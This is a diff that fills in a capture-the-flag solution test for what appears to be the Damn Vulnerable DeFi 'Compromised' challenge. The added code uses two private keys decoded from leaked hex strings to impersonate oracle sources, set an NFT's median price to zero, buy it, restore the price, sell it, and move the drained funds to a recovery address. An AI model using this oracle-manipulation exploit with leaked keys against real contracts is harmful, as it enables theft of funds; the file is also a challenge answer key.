@@ -75,7 +75,52 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        //4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130
+        //4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535
+
+        uint256 sk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 sk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        address source1Pk = vm.addr(sk1); // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
+        address source2Pk = vm.addr(sk2); // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
+
+        // manipulate price oracle: set NFT price to 0
+        vm.startPrank(source1Pk);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+        vm.startPrank(source2Pk);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        uint256 medianPrice = oracle.getMedianPrice("DVNFT");
+        assertEq(medianPrice, 0);
+
+        // buy NFT for 0 ETH
+        vm.startPrank(player);
+        uint256 nftId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+        vm.stopPrank();
+
+        // manipulate price oracle: set NFT back to initial price
+        vm.startPrank(source1Pk);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+        vm.startPrank(source2Pk);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        medianPrice = oracle.getMedianPrice("DVNFT");
+        assertEq(medianPrice, INITIAL_NFT_PRICE);
+
+        // sell NFT for initial price
+        vm.startPrank(player);
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+        vm.stopPrank();
+
+        // recover funds
+        vm.startPrank(player);
+        payable(recovery).transfer(INITIAL_NFT_PRICE);
+        vm.stopPrank();
     }
 
     /**
